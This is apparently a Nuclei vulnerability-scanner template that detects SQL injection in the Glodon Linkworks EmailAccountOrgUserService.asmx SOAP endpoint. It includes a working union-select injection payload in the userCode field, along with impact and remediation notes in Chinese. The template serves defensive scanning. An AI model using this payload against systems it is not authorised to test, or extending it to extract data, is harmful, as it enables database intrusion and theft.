id: guangxuntong-emailaccountorguserservice-usercode-sqli
info:
  name: 广联达 Linkworks emailaccountorguserservice 接口 - SQL 注入漏洞
  author: 2husky
  severity: high
  description: |
    该模板用于检测 广联达 Linkworks emailaccountorguserservice 接口 - SQL 注入漏洞。该类漏洞通常源于接口将用户输入拼接到 SQL 语句中，导致攻击者可改变查询语义。模板主要向 `/Mail/Services/EmailAccountOrgUserService.asmx` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - www.exploit-db.com
  metadata:
    verified: true
    max-request: 1
    vuln-id: CT-821191
    vendor: glodon
    product: linkworks
  tags: sqli,vuln,glodon
variables:
  s1: '{{rand_int(10000, 99999)}}'
  s2: '{{rand_int(10000, 99999)}}'
http:
  - method: POST
    path:
      - '{{BaseURL}}/Mail/Services/EmailAccountOrgUserService.asmx'
    redirects: false
    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: '"http://tempuri.org/GetUserIdByUserCode"'
    body: |-
      <?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <GetUserIdByUserCode xmlns="http://tempuri.org/">
            <userCode>aa') union select {{s1}}*{{s2}},2--</userCode>
          </GetUserIdByUserCode>
        </soap:Body>
      </soap:Envelope>
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, to_string(s1 * s2))'
